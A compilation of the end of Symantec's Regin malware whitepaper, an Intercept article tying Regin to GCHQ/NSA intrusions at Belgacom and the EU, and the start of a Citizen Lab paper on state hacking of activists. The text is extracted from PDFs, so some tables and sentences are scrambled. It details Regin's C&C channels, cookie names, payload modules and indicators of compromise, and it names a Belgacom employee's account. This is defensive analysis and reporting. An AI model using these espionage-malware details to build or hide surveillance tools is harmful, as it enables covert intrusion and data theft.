container is similar to the FAT file system . One major difference is that files do           Figure 4 . Physical layout
not have a name ; instead , they ’re identified using a binary tag . The tag itself is the       of an EVFS container
Page 11
Regin : Top - tier espionage tool enables stealthy surveillance
concatenation of a major number and a minor number . The major number typically indicates the major function
group that will handle the file .
A container starts with the header in Table 3
( little - endian ordering ) .                               Table 3 . The container ’s header
Offset                 Type        Description
The header is followed by the file entry table
( Table 4 ) . Each file entry is 13h+taglen bytes           00h                    WORD        Sector size in bytes
long .                                                    02h                    WORD        Maximum sector count
The sectors follow ( Table 5 ) . A sector of                04h                    WORD        Maximum file count
sectsize bytes starts with a DWORD pointing to           06h                    BYTE        File tag length ( taglen )
the next sector ( if the file does not fit within a
single sector ) , followed by sectsize-4 bytes of          07h                    DWORD       Header CRC
payload data .                                            0Bh                    DWORD       File table CRC
As explained above , the files are encrypted .             0Fh                    WORD        Number of files
Other layers of encryption and compression               11h                    WORD        Number of sectors in use
may also be in place , although those would be            13h                    -           Sector - use bitmap
handled by higher level components .
Command - and - control                                       Table 4 . The container ’s file entry table
operations                                                 Offset          Type            Description
00h             DWORD           CRC
Regin ’s C&C operations are extensive . These
backchannel operations are bidirectional ,         04h            DWORD           File offset
which means either the attackers can initiate     08h            DWORD           Offset to first sector holding the file data
communications with compromised computers
on the border network or the compromised          0Ch            BYTE[taglen ]    File tag
computers can initiate communications with
the attacker . Furthermore , compromised
computers can serve as a proxy for other          Table 5 . The container ’s sectors
infections and command and control can            Offset       Type                    Description
also happen in a peer - to - peer fashion . All
00h          DWORD                   Next sector offset , or 0
communications are strongly encrypted and
can happen in a two - stage fashion where the       04h          BYTE[sectsize-4 ]        Data
attacker may contact a compromised computer
using one channel to instruct it to begin
communications on a different channel . Four transport protocols are available for C&C :
• 	  ICMP : Payload information can be encoded and embedded in lieu of legitimate ICMP / ping data . The string
‘ shit’ is scattered in the packet for data validation . In addition , CRC checks use the seed ‘ 31337’.
• 	  UDP : Raw UDP payload
• 	  TCP : Raw TCP payload
• 	  HTTP : Payload information can be encoded and embedded within cookie data under the names SESSID ,
SMSWAP , TW , WINKER , TIMESET , LASTVISIT , AST.NET_SessionId , PHPSESSID , or phpAds_d . This information
can be combined with another cookie for validation under the names USERIDTK , UID , GRID , UID = PREF = ID , TM ,
_ _ utma , LM , TMARK , VERSION , or CURRENT
The C&C operations are undertaken by various modules , including major groups C373h , 19h , 9 , as well as Stage
5 payloads , such as C375h and 1Bh .
Logging
Regin logs data to the ApplicationLog.dat file . This file is not an encrypted container , but it is encrypted and
compressed .
Page 12
PAYLOADS
The extensible
nature of Regin and
its custom payloads
indicate that many
payloads are likely
to exist in order to
enhance Regin ’s
capabilities ...
Regin : Top - tier espionage tool enables stealthy surveillance
Payloads
Regin can be distributed with various payload modules or receive payload modules after infection . The
extensible nature of Regin and its custom payloads indicate that many additional payloads are likely to exist in
order to enhance Regin ’s capabilities . Furthermore , we have found data files accompanying payload modules
that have not been recovered . The following table describes the Stage 4 kernel payload modules and Stage 5
user mode payload modules , which we have seen several variants of Regin use .
Table 6 . Regin ’s stage 4 kernel payload modules and stage 5 user mode payload modules
File type Major        Description
SYS        0003         Driver
SYS        C433         Rootkit
SYS        C42B         PE loader
SYS        C42D         DLL injection
SYS        C3C3         Network packet filter driver similar to the WinPCap ( protocol filter version 3.5 )
Used to set TCP and UDP pass - through filters and to bypass firewalls .
Executes BPF ( Berkeley Packet Filter ) bytecode , stored in Stage 5 data files .
SYS        4E69         Network port blocker
DLL        C363         Network packet capture
DLL        4E3B         Retrieve proxy information for a web browser ( Internet Explorer , Netscape , Firefox ) through registry or configu-
ration files ( for example , prefs.js , refs.js , etc . ) Enumerate sessions and user accounts
DLL        290B         Password stealer
• 	   Windows Explorer credentials
• 	   Windows Explorer pstore records
• 	   Internet Explorer LegacySettings
• 	   Data for a Winlogon notification package named “ cryptpp ”
DLL        C375         C&C HTTP / cookies
DLL        C383         SSL communications
DLL        C361         Supporting cryptography functions
DLL        001B         ICMP backchannel
DLL        C399         Record builder for ApplicationLog . Evt
DLL        C39F         Processes file : % Temp%\~b3y7f.tmp
DLL        C3A1         Miscellaneous functions
DLL        28A5         Miscellaneous functions
DLL        C3C1         Miscellaneous functions
DLL        C3B5         Gather system information
• 	   CPUMemory
• 	   Drives and shares
• 	   Devices
• 	   Windows information ( including type , version , license info , owner info )
• 	   Installed software
• 	   Running processes ( through HKEY_PERFORMANCE_DATA i d 230 )
• 	   Services
• 	   Schedules tasks and jobs
• 	   Running desktop sessions
• 	   User accounts information
• 	   System ’s auditing rules / policy
• 	   System time and Windows install time
Page 14
Regin : Top - tier espionage tool enables stealthy surveillance
DLL         C36B        UI manipulation
• 	    Capture screenshots
• 	    Log keystrokes
• 	    Lock the workstation / input Ctrl - Alt - Del
• 	    Click functionality ( through three commands : go , click & release , return to original position )
• 	    End processes
DLL         C351        File system exploration primitives and forensic level exploration including a raw NTFS parser
• 	     Get miscellaneous file information and properties
• 	     Browse directories
• 	     Read and write files
• 	     Move and copy files
• 	     Read and recover partially or fully deleted files
• 	     Compute file hashes
DLL         2B5D        Process and module manipulation
• 	    Read processes and modules
• 	    Processes running times , quotas , privileges
• 	    Skip Russian or English Microsoft files when scanning
• 	    Check for newly introduced PE files in the last two days
DLL         C3CD        Enumerate TCP / IP interfaces from % System%\CurrentControlSet\Services\Tcpip\Linkage\bind
DLL         C38F        TCPDump utility
DLL         C3C5        Libnet binary
DLL         27E9        IIS web server log theft
Enumeration through COM objects to find IIS logs . Ability to retrieve partial or complete log information .
• 	    Partial : Log type , last log , older log timestamps
• 	    Complete : Entire log data is exfiltrated
The IIS web server log stealing module , 27E9h , is an example of a payload module that was installed after the initial
infection and was specifically deployed for a particular target .
64-bit version
Only a small amount of the 64-bit Regin files have been recovered . These samples may represent version 2.0 or
their differences may possibly be solely specific to 64-bit versions of Regin . We also recovered files from infected
computers that may or may not be associated with 64-bit Regin , including several variants of svcsstat.exe , a file that
aims to retrieve binary data over pipes or sockets and execute the data .
File names
The recovered files do not appear to fundamentally vary from their 32-bit counterparts , apart from a few noteworthy
differences .
The 32-bit and 64-bit versions of Regin use different file names . These differences are shown in the first section of
this paper as well as in the appendix . Most importantly , in the 64-bit version of Regin , the names of containers are
changed :
• 	  PINTLGBP.IMD replaces SystemLog . Evt
• 	  PINTLGBPS.IMD replaces SecurityLog . Evt
Stage differences
The 64-bit version of Regin ’s Stage 1 ( wshnetc.dll ) is no longer a kernel mode driver , as drivers under 64-bit Windows
must be signed . Instead , Stage 1 is a user mode DLL loaded as a Winsock helper when the computer is starting
up . Rather than loading Stage 2 from an NTFS extended attribute , Stage 1 looks for the last partition ( in terms of
Page 15
Regin : Top - tier espionage tool enables stealthy surveillance
physical location ) on disk and searches for the payload in the raw sectors in this area of the disk .
The 64-bit Regin ’s Stage 3 has not been recovered . We believe that it may not exist , as the 32-bit version is a driver .
Stage 4 is an orchestrator just like its 32-bit counterpart and it uses the same major and minor values to export
functionality .
Stage 5 uses the following filenames :
• 	  % Windir%\IME\IMESC5\DICTS\PINTLGBP.IMD contains Stage 5 user payloads , replacing SystemLog . Evt in the
32-bit version
• 	  % Windir%\IME\IMESC5\DICTS\PINTLGBS.IMD contains Stage 5 data files , replacing SecurityLog . Evt in the 32-bit
version
• 	  The equivalent files for SystemAudit . Evt and SecurityAudit . Evt were not recovered
No Stage 5 payload modules have been recovered .
Conclusion
Regin is a highly - complex threat which has been used for large - scale data collection or intelligence gathering
campaigns . The development and operation of this threat would have required a significant investment of time
and resources . Threats of this nature are rare and are only comparable to the Stuxnet / Duqu family of malware .
The discovery of Regin serves to highlight how significant investments continue to be made into the development
of tools for use in intelligence gathering . Many components of Regin have still gone undiscovered and additional
functionality and versions may exist .
Protection
Symantec and Norton products detect this threat as Backdoor . Regin .
Page 16
APPENDIX
Regin : Top - tier espionage tool enables stealthy surveillance
Appendix
Data files
Regin ’s data files are classified as Stage 5 components and are contained in an EVFS container .
Table 7 . Data files used by Stage 4 ’s framework DLL
Major       Minor       Description
0001        -           -
000D        -           -
000F        01          High - entropy blobs , cryptographic data
02          High - entropy blobs , cryptographic data
003D        -           -
0007        -           -
000B        01          Contains a path to the log file .
Typically , % System\config\ApplicationLog . Evt
02          Small 8 byte files
0033        01          A single DWORD , such as 111Ch
03          A single DWORD , such as 1114h
0011        -           -
0013        01          Unknown list of records
02          A single byte , such as 3
C373        01          BPF bytecode for the netpcap driver — allows UDP passthrough
02          A WORD value , such as 1
0019        01          BPF bytecode for the netpcap driver — allows TCP passthrough
02          A WORD value , such as 1
0009        00          A single DWORD , such as 11030B15h
01          Contains C&C location information
02          C&C routines to be executed :
• 	   ( C375 , 1 ) param= 08 02
• 	   ( 19 , 1 ) param= 44 57 58 00
• 	   ( C373 , 1 ) param= 08 02
• 	   ( 1B , 1 ) param= 20 00
03          Routines to be executed
• 	    ( 4E69 , 2 )
• 	    ( 19 , 2 )
• 	    ( 1B , 2 )
• 	    ( C373 , 2 ) (
• 	    C375 , 2 )
• 	    ( C383 , 2)(C363 , 2 )
07          RC5 key used to decrypt command - and - control packets
09          Unknown data
0B          Unknown data
12          A single byte , such as 1
17          Unknown data
Page 18
Regin : Top - tier espionage tool enables stealthy surveillance
As the data files are stored in a container , they do       Table 8 . Data files used by Stage 5 ’s modules ( payloads )
not have names . Just like Stage 5 modules , they are
referenced by their filetag , which is the aggregation       Major         Minor        Description
of the major and minor identifiers . The major               C363          02           6 bytes ( 01 00 00 00 00 00 )
identifier indicates which major routine group likely       4E3B          -
handles or creates the file .
290B          -
Not all data files have been recovered , so the              C375          01           Dword ( 1 )
information remains incomplete .
02           Dword ( 0 )
Data files associated with Stage 4 kernel modules
C383          01           Dword ( 1 )
have not been recovered
02           Dword ( 0 )
Table 8 lists recovered data files used by Stage 5
10           64 bytes ( 512 bits)Diffie Hellman , p ( prime )
modules .
11           Byte ( 2)Diffie Hellman , g ( generator )
The associated modules that supposedly
manipulate those data files were not recovered .             C361          10           File containing timestamps and high
entropy dataUnclear
11           Dword ( E10h )
12           Dword ( 2 )
001B          -
C399          -
C39F          00           Small file , 18h bytes , low entropy
01           Unencrypted unicode path ,
% Temp%\~B3Y7F.tmp
C3A1          01           Small file , 6 bytes ( 08 01 00 00 00 01 )
28A5          02           Small file , 18h bytes , unknown
C3C1          -            -
C3B5          -            -
C36B          -            -
C351          -            -
2B5D          -           -
C3CD          -           -
C38F          -           -
C3C5          -           -
27E9          -           -
Table 9 . Orphaned data files
Major Minor Description
4E25     00         Byte ( 1 )
01         Byte ( 2 )
28A4     00         Unknown
02         Small file , 8 bytes ( 01 00 00 00 00 00 00 00 )
DEAB     01         Small file , 8 bytes ( 00 00 01 01 04 00 00 00 )
Page 19
Regin : Top - tier espionage tool enables stealthy surveillance
Indicators of compromise
The following details can be used to help determine whether you have been impacted by this threat .
File MD5s
2c8b9d2885543d7ade3cae98225e263b
4b6b86c7fec1c574706cecedf44abded
187044596bc1328efa0ed636d8aa4a5c
06665b96e293b23acc80451abb413e50
d240f06e98c8d3e647cbf4d442d79475
6662c390b2bbbd291ec7987388fc75d7
ffb0b9b5b610191051a7bdf0806e1e47
b29ca4f22ae7b7b25f79c1d4a421139d
1c024e599ac055312a4ab75b3950040a
ba7bb65634ce1e30c1e5415be3d1db1d
b505d65721bb2453d5039a389113b566
b269894f434657db2b15949641a67532
bfbe8c3ee78750c3a520480700e440f8
File names / paths
usbclass.sys
adpu160.sys
msrdc64.dat
msdcsvc.dat
% System%\config\SystemAudit . Evt
% System%\config\SecurityAudit . Evt
% System%\config\SystemLog.evt
% System%\config\ApplicationLog.evt
% Windir%\ime\imesc5\dicts\pintlgbs.imd
% Windir%\ime\imesc5\dicts\pintlgbp.imd
% Windir%\system32\winhttpc.dll
% Windir%\system32\wshnetc.dll
% Windir%\SysWow64\wshnetc.dll
% Windir%\system32\svcstat.exe
Page 20
Regin : Top - tier espionage tool enables stealthy surveillance
% Windir%\system32\svcsstat.exe
Extended attributes
% Windir%
% Windir%\cursors
% Windir%\fonts
% Windir%\System32
% Windir%\System32\drivers
Registry
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605 - 9452 - 4787-B793-
D0204917CA58 }
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\RestoreList\VideoBase
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605 - 9452 - 4787-B793-
D0204917CA5A }
Page 21
About Symantec
Symantec Corporation ( NASDAQ : SYMC ) is an information
protection expert that helps people , businesses and
governments seeking the freedom to unlock the opportunities
technology brings -- anytime , anywhere . Founded in April
1982 , Symantec , a Fortune 500 company , operating one of
the largest global data - intelligence networks , has provided
leading security , backup and availability solutions for where
vital information is stored , accessed and shared . The company ’s
more than 20,000 employees reside in more than 50 countries .
Ninety - nine percent of Fortune 500 companies are Symantec
customers . In fiscal 2014 , it recorded revenues of $ 6.7 billion .
To learn more go to www.symantec.com or connect with
Symantec at : go.symantec.com / social/.
For specific country offices and contact numbers , please visit our website .
Symantec World Headquarters                                                                                   Copyright © 2014 Symantec Corporation . All
350 Ellis St.                                                                                                 rights reserved . Symantec , the Symantec Logo ,
and the Checkmark Logo are trademarks or
Mountain View , CA 94043 USA                                                                                   registered trademarks of Symantec Corporation
+ 1 ( 650 ) 527 - 8000                                                                                              or its affiliates in the U.S. and other countries .
1 ( 800 ) 721 - 3934                                                                                              Other names may be trademarks of their
www.symantec.com                                                                                                                              respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation .
NO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use . Any use
of the technical documentation or the information contained herein is at the risk of the user . Documentation may include technical or other inaccuracies or
typographical errors . Symantec reserves the right to make changes without prior notice .

SECRET MALWARE IN EUROPEAN UNION ATTACK LINKED TO U.S. AND BRITISH INTELLIGENCE
Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the
European Union and a Belgian telecommunications company , according to security industry sources and technical analysis conducted by The Intercept .
Regin was found on infected internal computer systems and email servers at Belgacom , a partly state - owned Belgian phone and internet provider , following
reports last year that the company was targeted in a top - secret surveillance operation carried out by British spy agency Government Communications
Headquarters , industry sources told The Intercept .
The malware , which steals data from infected systems and disguises itself as legitimate Microsoft software , has also been identified on the same European Union
computer systems that were targeted for surveillance by the National Security Agency .
The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward
Snowden . The specific malware used in the attacks has never been disclosed , however .
The Regin malware , whose existence was first reported by the security firm Symantec on Sunday , is among the most sophisticated ever discovered by researchers .
Symantec compared Regin to Stuxnet , a state - sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility .
Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their
systems after they were compromised , linking the spy tool to the secret GCHQ and NSA operations .
Ronald Prins , a security expert whose company Fox IT was hired to remove the malware from Belgacom ’s networks , told The Intercept that it was “ the most
sophisticated malware ” he had ever studied .
“ Having analyzed this malware and looked at the [ previously published ] Snowden documents , ” Prins said , “ I ’m convinced Regin is used by British and American
intelligence services . ”
A spokesman for Belgacom declined to comment specifically about the Regin revelations , but said that the company had shared “ every element about the attack ”
with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion . “ It ’s impossible for us to comment on this , ” said Jan Margot , a
spokesman for Belgacom . “ It ’s always been clear to us the malware was highly sophisticated , but ever since the clean - up this whole story belongs to the past for
us . ”
In a hacking mission codenamed Operation Socialist , GCHQ gained access to Belgacom ’s internal systems in 2010 by targeting engineers at the company . The
agency secretly installed so - called malware “ implants ” on the employees’ computers by sending their internet connection to a fake LinkedIn page . The malicious
LinkedIn page launched a malware attack , infecting the employees’ computers and giving the spies total control of their systems , allowing GCHQ to get deep
inside Belgacom ’s networks to steal data .
The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the
company ’s network and customers , which include the European Commission , the European Parliament , and the European Council . The software implants used in
this case were part of the suite of malware now known as Regin .
One of the keys to Regin is its stealth : To avoid detection and frustrate analysis , malware used in such operations frequently adhere to a modular design . This
involves the deployment of the malware in stages , making it more difficult to analyze and mitigating certain risks of being caught .
Based on an analysis of the malware samples , Regin appears to have been developed over the course of more than a decade ; The Intercept has identified traces of
its components dating back as far as 2003 . Regin was mentioned at a recent Hack.lu conference in Luxembourg , and Symantec ’s report on Sunday said the
firm had identified Regin on infected systems operated by private companies , government entities , and research institutes in countries such as Russia , Saudi
Arabia , Mexico , Ireland , Belgium , and Iran .
The use of hacking techniques and malware in state - sponsored espionage has been publicly documented over the last few years : China has been linked to extensive
cyber espionage , and recently the Russian government was also alleged to have been behind a cyber attack on the White House . Regin further demonstrates that
Western intelligence agencies are also involved in covert cyberespionage .
GCHQ declined to comment for this story . The agency issued its standard response to inquiries , saying that “ it is longstanding policy that we do not comment on
intelligence matters ” and “ all of GCHQ ’s work is carried out in accordance with a strict legal and policy framework , which ensures that our activities are
authorised , necessary and proportionate . ”
The NSA said in a statement , “ We are not going to comment on The Intercept ’s speculation . ”
The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to
encourage further research and analysis . ( To download the malware , click here . The file is encrypted ; to access it on your machine use the password “ infected . ” )
What follows is a brief technical analysis of Regin conducted by The Intercept ’s computer security staff . Regin is an extremely complex , multi - faceted piece of
work and this is by no means a definitive analysis .
In the coming weeks , The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian
and Dutch newspapers De Standaard and NRC Handelsblad .
Origin of Regin
In Nordic mythology , the name Regin is associated with a violent dwarf who is corrupted by greed . It is unclear how the Regin malware first got its name , but the
name appeared for the first time on the VirusTotal website on March 9th 2011 .
Der Spiegel reported that , according to Snowden documents , the computer networks of the European Union were infiltrated by the NSA in the months before the
first discovery of Regin .
Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided
samples of its code . This discovery , the sources said , may have been what brought Regin to the wider attention of security vendors .
Also on March 9th 2011 , Microsoft added related entries to its Malware Encyclopedia :
Alert level : Severe
First detected by definition : 1.99.894.0
Latest detected by definition : 1.173.2181.0 and higher
First detected on : Mar 09 , 2011
This entry was first published on : Mar 09 , 2011
This entry was updated on : Not available
Two more variants of Regin have been added to the Encyclopedia , Regin . B and Regin . C. Microsoft appears to detect the 64-bit variants of Regin as Prax . A and
Prax . B. None of the Regin / Prax entries are provided with any sort of summary or technical information .
The following Regin components have been identified :
Loaders
The first stage are drivers which act as loaders for a second stage . They have an encrypted block which points to the location of the 2nd stage payload . On NTFS ,
that is an Extended Attribute Stream ; on FAT , they use the registry to store the body . When started , this stage simply loads and executes Stage 2 .
The Regin loaders that are disguised as Microsoft drivers with names such as :
serial.sys
cdaudio.sys
atdisk.sys
parclass.sys
usbclass.sys
Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems .
Second stage loader
When launched , it cleans traces of the initial loader , loads the next part of the toolkit and monitors its execution . On failure , Stage 2 is able to disinfect the
compromised device . The malware zeroes out its PE ( Portable Executable , the Windows executable format ) headers in memory , replacing “ MZ ” with its own magic
marker 0xfedcbafe .
Orchestrator
This component consists of a service orchestrator working in Windows’ kernel . It initializes the core components of the architecture and loads the next parts of the
malware .
Information Harvesters
This stage is composed of a service orchestrator located in user land , provided with many modules which are loaded dynamically as needed . These modules can
include data collectors , a self - defense engine which detects if attempts to detect the toolkit occur , functionality for encrypted communications , network capture
programs , and remote controllers of different kinds .
Stealth Implant
The Intercept ’s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header , which is a sign that it
might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit .
This picture shows the very first bytes of the sample in question , showing the unique 0xfedcbafe header at the beginning .
In order to access information stored in the computer ’s memory , programs use objects that reference specific locations in memory called pointers . This binary file
contains some of such pointers initialized , which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised
system .
The sample has the following SHA256 hash :
fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129
This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible .
When a Windows kernel driver needs to allocate memory to store some type of data , it creates so called kernel pools . Such memory allocations have specific
headers and tags that are used to identify the type of objects contained within the block . For example such tags could be Proc , Thrd or File , which respectively
indicate that the given block would contain a process , thread or file object structure .
When performing forensic analysis of a computer ’s memory , it is common to use a technique called pool scanning to parse the kernel memory , enumerate such
kernel pools , identify the type of content and extract it .
Just like Regin loader drivers , this driver repeatedly uses the generic “ Ddk “ tag with ExAllocatePoolWithTag ( ) when allocating all kernel pools :
This picture shows the use of the “ ddk “ tag when allocating memory with the Windows ExAllocatePoolWIthTag ( ) function .
The generic tag which is used throughout the operating system when a proper tag is not specified . This makes it more difficult for forensic analysts to find any
useful information when doing pool scanning , since all its memory allocations will mix with many generic others .
In addition , when freeing memory using ExFreePool ( ) , the driver zeroes the content , probably to avoid leaving traces in pool memory .
The driver also contains routines to check for specific builds of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server
and Windows 2000 , and then adapts its behavior accordingly .
Windows kernel drivers operate on different levels of priority , from the lowest PASSIVE_LEVEL to the highest HIGH_LEVEL . This level is used by the processor
to know what service give execution priority to and to make sure that the system does n’t try to allocate used resources which could result in a crash .
This Regin driver recurrently checks that the current IRQL ( Interrupt Request Level ) is set to PASSIVE_LEVEL using the KeGetCurrentIrql ( ) function in many
parts of the code , probably in order to operate as silently as possible and to prevent possible IRQL confusion . This technique is another example of the level of
precaution the developers took while designing this malware framework .
Upon execution of the unload routine ( located at 0xFDEFA04A ) , the driver performs a long sequence of steps to remove remaining traces and artifacts .
Belgacom Sample
In an interview given to the Belgian magazine MondiaalNiews , Fabrice Clément , head of security of Belgacom , said that the company first identified the attack on
June 21 , 2013 .
In the same interview Clément says that the computers targeted by the attackers included staff workstations as well as email servers .
These statements confirm the timing and techniques used in the attack .
From previously identified Regin samples , The Intercept developed unique signatures which could identify this toolkit . A zip archive with a sample identified as
Regin / Prax was found in VirusTotal , a free , online website which allows people to submit files to be scanned by several anti - virus products . The zip archive was
submitted on 2013 - 06 - 21 07:58:37 UTC from Belgium , the date identified by Clément . Sources familiar with the Belgacom intrusion told The Intercept that this
sample was uploaded by a systems administrator at the company , who discovered the malware and uploaded it in an attempt to research what type of malware it
was .
The archive contains :
Along with other files The Intercept found the output of a forensic tool , GetThis , which is being run on target systems looking for malware . From the content of the
GetThis.log file , we can see that a sample called “ svcsstat.exe ” and located in C:\Windows\System32\ was collected and a copy of it was stored .
The malware in question is “ 0001000000000C1C_svcsstat.exe_sample ” . This is a 64bit variant of the first stage Regin loader aforementioned .
The archive also contains the output of ProcMon , “ Process Monitor ” , a system monitoring tool distributed by Microsoft and commonly used in forensics and
intrusion analysis .
This file identifies the infected system and provides a variety of interesting information about the network . For instance :
USERDNSDOMAIN = BGC.NET
USERDOMAIN = BELGACOM
USERNAME = id051897a
USERPROFILE = C:\Users\id051897a
The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server , indicating that it might one
of the compromised corporate mail server Fabrice Clément mentioned to Mondiaal News :
Path = C:\Program
Files\Legato\nsr\bin;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program
Files\Microsoft Network Monitor 3\;C:\Program Files\System Center Operations Manager 2007\;c:\Program Files ( x86)\Microsoft SQL
Server\90\Tools\binn\;D:\Program Files\Microsoft\Exchange Server\bin
Below is a list of hashes for the files The Intercept is making available for download . Given that that it has been over a year since the Belgacom operation was
publicly outed , The Intercept considers it likely that the GCHQ / NSA has replaced their toolkit and no current operations will be affected by the publication of
these samples .
Regin Samples
32-bit Loaders
20831e820af5f41353b5afab659f2ad42ec6df5d9692448872f3ed8bbb40ab92
7553d4a5914af58b23a9e0ce6a262cd230ed8bb2c30da3d42d26b295f9144ab7
f89549fc84a8d0f8617841c6aa4bb1678ea2b6081c1f7f74ab1aebd4db4176e4
fd92fd7d0f925ccc0b4cbb6b402e8b99b64fa6a4636d985d78e5507bd4cfecef
225e9596de85ca7b1025d6e444f6a01aa6507feef213f4d2e20da9e7d5d8e430
9cd5127ef31da0e8a4e36292f2af5a9ec1de3b294da367d7c05786fe2d5de44f
b12c7d57507286bbbe36d7acf9b34c22c96606ffd904e3c23008399a4a50c047
f1d903251db466d35533c28e3c032b7212aa43c8d64ddf8c5521b43031e69e1e
4e39bc95e35323ab586d740725a1c8cbcde01fe453f7c4cac7cced9a26e42cc9
a0d82c3730bc41e267711480c8009883d1412b68977ab175421eabc34e4ef355
a7493fac96345a989b1a03772444075754a2ef11daa22a7600466adc1f69a669
5001793790939009355ba841610412e0f8d60ef5461f2ea272ccf4fd4c83b823
a6603f27c42648a857b8a1cbf301ed4f0877be75627f6bbe99c0bfd9dc4adb35
8d7be9ed64811ea7986d788a75cbc4ca166702c6ff68c33873270d7c6597f5db
40c46bcab9acc0d6d235491c01a66d4c6f35d884c19c6f410901af6d1e33513b
df77132b5c192bd8d2d26b1ebb19853cf03b01d38afd5d382ce77e0d7219c18c
7d38eb24cf5644e090e45d5efa923aff0e69a600fb0ab627e8929bb485243926
a7e3ad8ea7edf1ca10b0e5b0d976675c3016e5933219f97e94900dea0d470abe
a0e3c52a2c99c39b70155a9115a6c74ea79f8a68111190faa45a8fd1e50f8880
d42300fea6eddcb2f65ffec9e179e46d87d91affad55510279ecbb0250d7fdff
5c81cf8262f9a8b0e100d2a220f7119e54edfc10c4fb906ab7848a015cd12d90
b755ed82c908d92043d4ec3723611c6c5a7c162e78ac8065eb77993447368fce
c0cf8e008fbfa0cb2c61d968057b4a077d62f64d7320769982d28107db370513
cca1850725f278587845cd19cbdf3dceb6f65790d11df950f17c5ff6beb18601
ecd7de3387b64b7dab9a7fb52e8aa65cb7ec9193f8eac6a7d79407a6a932ef69
e1ba03a10a40aab909b2ba58dcdfd378b4d264f1f4a554b669797bbb8c8ac902
392f32241cd3448c7a435935f2ff0d2cdc609dda81dd4946b1c977d25134e96e
9ddbe7e77cb5616025b92814d68adfc9c3e076dddbe29de6eb73701a172c3379
8389b0d3fb28a5f525742ca2bf80a81cf264c806f99ef684052439d6856bc7e7
32-bit Rootkit
fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129
32-bit Orchestrator
e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935
4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be
64-bit Loader ( Belgacom )
4d6cebe37861ace885aa00046e2769b500084cc79750d2bf8c1e290a1c42aaff
Photo credit : Winfried Rothermel / AP

When Governments Hack Opponents :
A Look at Actors and Technology
William R. Marczak , University of California , Berkeley , and The Citizen Lab ;
John Scott - Railton , University of California , Los Angeles , and The Citizen Lab ;
Morgan Marquis - Boire , The Citizen Lab ; Vern Paxson , University of California , Berkeley ,
and International Computer Science Institute
https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/marczak
This paper is included in the Proceedings of the
23rd USENIX Security Symposium .
August 20–22 , 2014 • San Diego , CA
ISBN 978 - 1 - 931971 - 15 - 7
Open access to the Proceedings of
the 23rd USENIX Security Symposium
is sponsored by USENIX
When Governments Hack Opponents : A Look at Actors and Technology
William R. Marczak                          John Scott - Railton                   Morgan Marquis - Boire
UC Berkeley , Citizen Lab                     UCLA , Citizen Lab                        Citizen Lab
Vern Paxson
UC Berkeley , ICSI
Abstract                                                              we provide extensive detail from both technical and operational
perspectives as seen in three countries . We view such character-
Repressive nation - states have long monitored telecommunica-           izations as the fundamental first step necessary for the rigorous ,
tions to keep tabs on political dissent . The Internet and online      scientific pursuit of a new problem space .
social networks , however , pose novel technical challenges to             For our study we draw upon several years of research we
this practice , even as they open up new domains for surveil-          have conducted into cases from Bahrain , Syria and the United
lance . We analyze an extensive collection of suspicious files         Arab Emirates . We frame the nature of these attacks , and the
and links targeting activists , opposition members , and non-           technology and infrastructure used to conduct them , in the con-
governmental organizations in the Middle East over the past           text of their impacts on real people . We hope in the process to
several years . We find that these artifacts reflect efforts to at-    inspire additional research efforts addressing the difficult prob-
tack targets’ devices for the purposes of eavesdropping , stealing     lem of how to adequately protect individuals with very limited
information , and/or unmasking anonymous users . We describe            resources facing powerful adversaries .
attack campaigns we have observed in Bahrain , Syria , and the             As an illustration of this phenomenon , consider the follow-
United Arab Emirates , investigating attackers , tools , and tech-       ing anecdote , pieced together from public reports and court
niques . In addition to off - the - shelf remote access trojans and        documents .
the use of third - party IP - tracking services , we identify commer-         At dawn on 3/12/13,1 police raided the house of 17-year-
cial spyware marketed exclusively to governments , including           old Ali Al - Shofa , confiscated his laptop and phone , and took
Gamma ’s FinSpy and Hacking Team ’s Remote Control Sys-                 him into custody . He was charged with referring to Bahrain ’s
tem ( RCS ) . We describe their use in Bahrain and the UAE , and          King as a “ dictator ” (          ) and “ fallen one ” (          ) on a
map out the potential broader scope of this activity by conduct-
pseudonymous Twitter account , @alkawarahnews . Accord-
ing global scans of the corresponding command - and - control
ing to court documents , Bahrain ’s Cyber Crime Unit had linked
( C&C ) servers . Finally , we frame the real - world consequences
an IP address registered in his father ’s name to the account on
of these campaigns via strong circumstantial evidence linking
12/9/12 . Operators of @alkawarahnews later forwarded a
hacking to arrests , interrogations , and imprisonment .
suspicious private message to one of the authors . The message
was received on 12/8/12 on a Facebook account linked to the
Twitter handle , and contained a link to a protest video , purport-
1     Introduction                                                     edly sent by an anti - government individual . The link redirected
through iplogger.org , a service that records the IP address
Computer security research devotes extensive efforts to pro-
